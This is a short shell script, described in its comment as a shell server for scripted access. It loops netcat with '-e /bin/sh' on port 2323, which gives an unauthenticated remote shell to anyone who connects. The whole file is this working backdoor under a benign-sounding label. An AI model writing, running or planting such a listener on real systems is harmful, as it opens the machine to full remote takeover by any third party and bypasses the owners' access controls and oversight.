#!/bin/sh
# raw nc-backed shell server on 2323 for scripted access (re-listens per connection)
while true; do nc -l -p 2323 -e /bin/sh; done
